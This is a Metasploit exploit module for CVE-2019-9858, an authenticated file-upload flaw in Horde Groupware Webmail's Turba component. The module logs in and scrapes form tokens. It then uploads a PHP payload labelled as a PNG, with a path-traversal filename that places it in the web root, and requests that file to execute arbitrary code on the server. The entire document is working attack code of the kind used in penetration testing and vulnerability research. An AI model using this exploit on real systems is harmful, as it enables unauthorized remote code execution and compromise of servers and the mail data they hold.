class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'Horde Form File Upload Vulnerability',
      'Description'     => %q{
          Horde Groupware Webmail contains a flaw that allows an authenticated remote
          attacker to execute arbitrary PHP code. The exploitation requires the Turba
          subcomponent to be installed.

          This module was tested on Horde versions 5.2.22 and 5.2.17 running Horde Form subcomponent < 2.0.19.
        },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Ratiosec',
        ],
      'References'      =>
        [
          ['CVE', '2019-9858'],
          ['URL', 'https://www.ratiosec.com/2019/horde-groupware-webmail-authenticated-arbitrary-file-injection-to-rce/'],
        ],
      'DisclosureDate'  => 'Mar 24 2019',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         =>
        [
          ['Automatic', { }],
        ],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI',  [true, 'The base path to the web application', '/']),
        OptString.new('USERNAME',   [true, 'The username to authenticate with']),
        OptString.new('PASSWORD',   [true, 'The password to authenticate with']),
        OptString.new('WEB_ROOT',   [true, 'Path to the web root', '/var/www/html'])
        # Appears to be '/usr/share/horde/' if installed with apt
      ])
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def webroot
    datastore['WEB_ROOT']
  end

  def horde_login(user, pass)
    res = send_request_cgi(
      'method'      => 'GET',
      'uri'         => normalize_uri(target_uri, 'login.php')
    )

    fail_with(Failure::Unreachable, 'No response received from the target.') unless res

    session_cookie = res.get_cookies
    vprint_status("Logging in...")
    res = send_request_cgi(
      'method'      => 'POST',
      'uri'         => normalize_uri(target_uri, 'login.php'),
      'cookie'      => session_cookie,
      'vars_post'   => {
        'horde_user'  => user,
        'horde_pass'  => pass,
        'login_post'    => '1'
      }
    )

    return res.get_cookies if res && res.code == 302
    []
  end

  def get_tokens(cookie)
    res = send_request_cgi(
      'method'      => 'GET',
      'uri'         => normalize_uri(target_uri, 'turba', 'add.php'),
      'cookie'      => cookie
    )

    if res && res.code == 200
      source_tokens = res.body.scan(/turba\/add\.php\?source=(.+)"/).flatten
      unless source_tokens.empty?
        form_tokens = res.body.scan(/name="turba_form_addcontact_formToken" value="(.+)"/).flatten
        return source_tokens[0], form_tokens[0], res.get_cookies
      end
    end
    nil
  end

  def exploit
    vprint_status("Authenticating using #{username}:#{password}")

    cookie = horde_login(username, password)
    fail_with(Failure::NoAccess, 'Unable to login. Verify USERNAME/PASSWORD or TARGETURI.') if cookie.nil? || cookie.empty?
    vprint_good("Authenticated to Horde.")

    tokens = get_tokens(cookie)
    fail_with(Failure::Unknown, 'Error extracting tokens.') if tokens.nil?
    source_token, form_token, secret_cookie = tokens

    vprint_good("Tokens \"#{source_token}\", \"#{form_token}\", and cookie \"#{secret_cookie}\" found.")

    payload_name = Rex::Text.rand_text_alpha_lower(10..12)
    payload_path = File.join(webroot, "static", "#{payload_name}.php")
    payload_path_traversal = File.join("..", payload_path)

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, 'image/png', nil, "form-data; name=\"object[photo][new]\"; filename=\"#{payload_name}.png\"")
    data.add_part("turba_form_addcontact", nil, nil, 'form-data; name="formname"')
    data.add_part(form_token, nil, nil, 'form-data; name="turba_form_addcontact_formToken"')
    data.add_part(source_token, nil, nil, 'form-data; name="source"')
    data.add_part(payload_path_traversal, nil, nil, 'form-data; name="object[photo][img][file]"')
    post_data = data.to_s

    print_status("Uploading payload to #{payload_path_traversal}")
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri, 'turba', 'add.php'),
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data,
      'cookie'    => cookie + ' ' + secret_cookie
    )

    fail_with(Failure::Unknown, "Unable to upload payload to #{payload_path_traversal}.") unless res && res.code == 200

    payload_url = normalize_uri(target_uri, 'static', "#{payload_name}.php")

    vprint_status("Executing the payload at #{payload_url}.")
    res = send_request_cgi(
        'uri'     => payload_url,
        'method'  => 'GET',
    )

    register_files_for_cleanup(payload_path)
  end
end
